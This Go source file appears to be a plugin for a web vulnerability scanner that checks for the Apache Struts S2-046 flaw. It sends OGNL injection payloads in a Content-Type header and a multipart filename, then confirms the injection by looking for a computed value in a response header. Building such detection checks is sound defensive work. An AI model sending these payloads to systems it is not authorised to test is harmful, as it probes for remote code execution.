/**
* @Author: shaochuyu
* @Date: 5/7/2022 11:30
 */
package struts

import (
	"bytes"
	"context"
	"strconv"
	"strings"
	"wscan/core/http"
	"wscan/core/model"
	"wscan/core/plugins/base"
	"wscan/core/utils"
	logger "wscan/core/utils/log"
)

type S046 struct {
}

func (*S046) Finger() (ret []*base.Finger) {

	ret = append(ret, &base.Finger{
		CheckAction: func(ctx context.Context, ab *base.Apollo) error {
			flow := ab.GetTargetFlow()
			logger.Debugf("Start detection S2-046, %s", flow.Request.URL())
			r1 := utils.RandInt(1000, 10000)
			r2 := utils.RandInt(1000, 10000)
			payload := `%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('W-RES',{{r1}}*{{r2}})}.multipart/form-data`
			payload = strings.Replace(payload, "{{r1}}", strconv.Itoa(r1), -1)
			payload = strings.Replace(payload, "{{r2}}", strconv.Itoa(r2), -1)
			req, err := http.NewRequest("GET", flow.Request.URL().String(), nil)
			if err != nil {
				logger.Error(err)
				return nil
			}
			req.SetHeader("Content-Type", payload)
			res, err := ab.HTTPClient.Respond(ctx, req)
			if err != nil {
				return nil
			}
			if strings.Contains(string(res.DumpHeader()), strconv.Itoa(r1*r2)) {
				v := ab.NewWebVuln(req, res, nil)
				if v != nil {
					v.SetTargetURL(flow.Request.URL())
					v.Payload = payload
					ab.OutputVuln(v)
				}
			}
			return nil
		},
		Channel: "web-path",
		Binding: &model.VulnBinding{ID: "struts/s2-046/default", Plugin: "struts/s2-046", Category: "struts/s2-046", Severity: model.SeverityCritical},
	})
	ret = append(ret, &base.Finger{
		CheckAction: func(ctx context.Context, ab *base.Apollo) error {
			flow := ab.GetTargetFlow()
			logger.Debugf("Start detection S2-046, %s", flow.Request.URL())
			boundary := strings.ToLower(utils.RandLetterNumbers(60))
			r1 := utils.RandInt(1000, 10000)
			r2 := utils.RandInt(1000, 10000)
			payload := `--{{boundary}}
Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-RES',{{r1}}*{{r2}})}.b"
Content-Type: application/octet-stream


--{{boundary}}--`
			payload = strings.Replace(payload, "{{r1}}", strconv.Itoa(r1), -1)
			payload = strings.Replace(payload, "{{r2}}", strconv.Itoa(r2), -1)
			payload = strings.Replace(payload, "{{boundary}}", boundary, -1)
			req, err := http.NewRequest("POST", flow.Request.URL().String(), nil)
			if err != nil {
				logger.Error(err)
				return nil
			}
			req.WithMultipartBody(bytes.NewReader([]byte(payload)), boundary)
			res, err := ab.HTTPClient.Respond(ctx, req)
			if err != nil {
				return nil
			}
			if strings.Contains(string(res.DumpHeader()), strconv.Itoa(r1*r2)) {
				v := ab.NewWebVuln(req, res, nil)
				if v != nil {
					v.SetTargetURL(flow.Request.URL())
					v.Payload = payload
					ab.OutputVuln(v)
				}
			}
			return nil
		},
		Channel: "web-path",
		Binding: &model.VulnBinding{ID: "struts/s2-046/default", Plugin: "struts/s2-046", Category: "struts/s2-046", Severity: model.SeverityCritical},
	})
	return
}
